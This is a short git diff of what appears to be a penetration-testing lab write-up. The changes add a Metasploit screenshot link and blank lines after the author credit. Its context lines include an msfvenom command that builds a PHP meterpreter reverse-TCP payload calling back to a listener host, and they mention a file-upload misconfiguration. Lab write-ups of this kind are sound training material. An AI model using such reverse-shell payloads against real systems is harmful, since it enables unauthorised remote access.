@@ -110,7 +110,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.16.66 LPORT=9999 -f raw > she
 
 Output confirmed: `Payload size: 34049 bytes`
 
-<!-- INSERT IMAGE -->
+![metasploit.jpg](./metasploit.jpg)
 ---
 
 ### Step 2 — Configuring Metasploit Listener
@@ -219,4 +219,9 @@ This lab chain illustrates how a single misconfiguration — an unrestricted fil
 
 ---
 
+
 *Write-up by Lereko Mohlomi | [LinkedIn](https://www.linkedin.com/in/lereko-mohlomi/)*
+
+
+
+
